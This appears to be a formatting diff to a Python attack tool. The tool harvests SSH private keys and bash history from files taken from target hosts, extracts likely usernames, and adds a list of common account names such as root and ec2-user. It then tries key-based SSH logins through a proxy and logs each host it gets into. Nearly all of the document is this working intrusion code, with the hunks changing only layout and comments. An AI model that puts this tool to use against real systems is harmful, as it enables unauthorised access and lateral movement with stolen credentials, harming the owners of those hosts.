@@ -21,6 +21,7 @@ def get_ssh_files(file_list: list):
             ssh_files.append(file)
     return ssh_files
 
+
 def get_bash_history_files(file_list: list):
     """Get all bash history files from the file list."""
     bash_hist_files = []
@@ -28,8 +29,9 @@ def get_bash_history_files(file_list: list):
         posix_path_str = str(file)
         parts = posix_path_str.split("/")
         is_bash_hist = (
-            (len(parts) > 2 and parts[0] == "home" and parts[2] == ".bash_history") or
-            (len(parts) > 3 and parts[1] == "home" and parts[3] == ".bash_history")
+            len(parts) > 2 and parts[0] == "home" and parts[2] == ".bash_history"
+        ) or (
+            len(parts) > 3 and parts[1] == "home" and parts[3] == ".bash_history"
         )
         if is_bash_hist:
             if test_directory(file):
@@ -87,10 +89,9 @@ def get_username_from_bash_history(contents: list):
         if line_parts[0] != "cd":
             continue
         if len(line_parts) == 1:
-            continue # example: cd (no path)
-        # we know cd starts the line and there is likely a path 
+            continue
         path_parts = line_parts[1].split("/")
-        if path_parts[0] == '':
+        if path_parts[0] == "":
             username = path_parts[2]
         else:
             username = path_parts[1]
@@ -121,7 +122,9 @@ def get_content_from_bash_histories(bash_file_files: list):
 def get_all_targets(proxy_host_port: str):
     """Process all downloaded targets and attempt SSH access."""
     if not ensure_downloads():
-        print("[-] No downloads directory found. Run a scan with -e first to download files.")
+        print(
+            "[-] No downloads directory found. Run a scan with -e first to download files."
+        )
         return
     for target in os.listdir("downloads"):
         if not test_ipaddress(target):
@@ -131,43 +134,63 @@ def get_all_targets(proxy_host_port: str):
         bash_hist_files = get_bash_history_files(downloaded_files)
         if len(ssh_files) == 0 and len(bash_hist_files) == 0:
             continue
-        # get all usernames here
         bash_hist_usernames = get_content_from_bash_histories(bash_hist_files)
         print(f"bash hist usernames found: {bash_hist_usernames}")
 
-        # get a list of all the targets private keys
         list_of_private_keys = get_private_key(ssh_files)
-        # get a list of all the targets public keys 
         list_of_public_keys = get_public_keys(ssh_files)
-        # parse the public keys for valid usernames and get a list of valid usernames
         usernames_ssh_keys = get_contents_from_pub_keys(list_of_public_keys)
         usernames_comb = usernames_ssh_keys.union(bash_hist_usernames)
         do_executor(target, usernames_comb, list_of_private_keys, proxy_host_port)
 
 
-def do_executor(target: str, usernames_from_pub_keys: set,
-                priv_keys: list, proxy_host_port: str):
+def do_executor(
+    target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str
+):
     """Attempt SSH connections using discovered keys and usernames."""
     usernames = [
-        "root", "admin", "test", "guest", "info", "adm",
-        "mysql", "user", "ubuntu", "administrator", "oracle", "ftp",
-        "pi", "debian", "ansible", "ec2-user", "vagrant", "azureuser"
+        "root",
+        "admin",
+        "test",
+        "guest",
+        "info",
+        "adm",
+        "mysql",
+        "user",
+        "ubuntu",
+        "administrator",
+        "oracle",
+        "ftp",
+        "pi",
+        "debian",
+        "ansible",
+        "ec2-user",
+        "vagrant",
+        "azureuser",
     ]
     comb_usernames = list(usernames_from_pub_keys) + usernames
     for priv_key in priv_keys:
         os.chmod(priv_key, 0o600)
         for name in comb_usernames:
-            ssh_target = SSHTarget(proxy_host_port, target, 22, name, key=str(priv_key))
-            print(f"[*] {proxy_host_port} -> {ssh_target.username}@"
-                  f"{ssh_target.host}:{ssh_target.port} {ssh_target.key}")
+            ssh_target = SSHTarget(
+                proxy_host_port, target, 22, name, key=str(priv_key)
+            )
+            print(
+                f"[*] {proxy_host_port} -> {ssh_target.username}@"
+                f"{ssh_target.host}:{ssh_target.port} {ssh_target.key}"
+            )
             client, sock = ssh_target.create_client()
             if sock is None:
                 os.remove(priv_key)
-                return # ssh server not listening, move on to the next host
+                return
             if ssh_target.connect_key(client, sock):
-                write_accessed_host(ssh_target.host, ssh_target.port, ssh_target.username, ssh_target.key)
-                return # moves onto the next target
-        # we failed, do cleanup here
+                write_accessed_host(
+                    ssh_target.host,
+                    ssh_target.port,
+                    ssh_target.username,
+                    ssh_target.key,
+                )
+                return
         os.remove(priv_key)
 
 
@@ -177,7 +200,7 @@ def write_accessed_host(host: str, port: int, username: str, key: str):
     cursor = conn.cursor()
     cursor.execute(
         "INSERT INTO AccessedHosts (ip_addr, port, username, key) VALUES (?, ?, ?, ?)",
-        (host, port, username, key)
+        (host, port, username, key),
     )
     conn.commit()
     conn.close()
